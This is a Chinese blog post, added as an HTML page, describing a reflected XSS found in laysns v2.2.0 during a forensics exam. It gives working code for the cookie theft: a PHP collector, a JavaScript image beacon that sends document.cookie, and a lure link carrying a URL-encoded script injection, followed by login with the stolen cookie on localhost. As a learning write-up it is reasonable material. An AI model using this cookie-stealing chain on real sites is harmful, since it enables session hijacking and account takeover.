@@ -1,0 +1,171 @@
+
+<!DOCTYPE html>
+<html lang="Chinese" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>KANGEL</title>
+
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Life is beautiful!,"> 
+    <meta name="author" content="kangel"> 
+    <link rel="alternative" href="atom.xml" title="KANGEL" type="application/atom+xml"> 
+    <link rel="icon" href="/img/2.png"> 
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+</head>
+
+<body class="loading">
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">xss_laysns</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">xss_laysns</h1>
+        <div class="stuff">
+            <span>十二月 26, 2018</span>
+            
+  <ul class="post-tags-list"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/web/">web</a></li><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/xss/">xss</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <p>0x00前言</p>
+<p>这其实是电子数据取证的期末考试案例，考的是云服务器取证。看着很像有xss漏洞的样子，抱着试一试的心态测试了一下，哈哈还真有。后来上网查了一下，好像是被曝出有前台xss漏洞的laysns v2.2.0。不管了，修复是不可能去修复了，有漏洞我就先攻击一波再说。</p>
+<p>0x01漏洞检测</p>
+<p>看到搜索框，心中就燃起了炽烈的求知欲。前段时间有个大佬教了我一段JS代码，一直不明白什么意思，不如搜一搜。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'xss'</span>)&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+<p>输入以上代码，就在按下回车的那一刻，突然弹出下面这么一个东西，下了我一跳。</p>
+<p><img src="/2018/12/26/xss_laysns/1.png" alt=""></p>
+<p>好了，果然存在反射型xss，开始攻击。</p>
+<p>0x02跨站脚本攻击</p>
+<p>在攻击之前，一直不明白，为什么这种漏洞叫Cross-site Script。一般测试都只是Script attack，并没有Cross-site。但实际攻击中的JS恶意代码肯定是在攻击者的站点下面。那么，实施什么攻击好呢？盗取cookie吧，简单又惬意。好了，不说废话了，上脚本。</p>
+<p>首先在攻击站点创建cookie.txt用来接收cookie，创建hack.php作为手机cookie的接口，代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line">    $cookie = $_GET[<span class="string">'q'</span>]; </span><br><span class="line"></span><br><span class="line">    var_dump($cookie); </span><br><span class="line"></span><br><span class="line">    $myFile = <span class="string">"cookie.txt"</span>; </span><br><span class="line"></span><br><span class="line">    file_put_contents($myFile, $cookie); </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>接着创建JS脚本hack.js，代码如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line"></span><br><span class="line">img.src = <span class="string">"http://localhost/hack/hack.php?q="</span>+<span class="built_in">document</span>.cookie;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.append(img);</span><br></pre></td></tr></table></figure>
+<p>最后创建一个HTML页面来诱导用户hack.html,代码如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://localhost/sns/search.html?ks=%3Cscript+</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">src%3Dhttp%3A%2F%2Flocalhost%2Fhack%2Fhack.js%3E%3C%2Fscript%3E&amp;commend=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">all&amp;ssid=s5-e&amp;search_type=item&amp;atype=&amp;filterFineness=&amp;rr=</span></span></span><br><span class="line"><span class="tag"><span class="string"></span></span></span><br><span class="line"><span class="tag"><span class="string">1&amp;pcat=food2011&amp;style=grid&amp;cat="</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>脚本准备好了，接下来就是实施攻击了，打开hack.html，点击click me，页面跳转，cookie.txt收到cookie。用该cookie进行登录。</p>
+<p><img src="/2018/12/26/xss_laysns/2.png" alt=""></p>
+<p>登录成功，攻击完成！</p>
+<p>0x03结语</p>
+<p>由于前端不是很熟，没法实现更高级的攻击，但也学习了一波xss，感受到了跨站脚本攻击的魅力。不过现在的网站，主流浏览器都有各种应对xss的防御策略，想要实施更深层的攻击，还是要继续学习！此篇博客毫无技术含量，仅作学习之余以放松。</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        <li title='0' data-url='http://link.hhtjim.com/163/5146554.mp3'></li>
+                    
+                        <li title='1' data-url='http://link.hhtjim.com/qq/001faIUs4M2zna.mp3'></li>
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
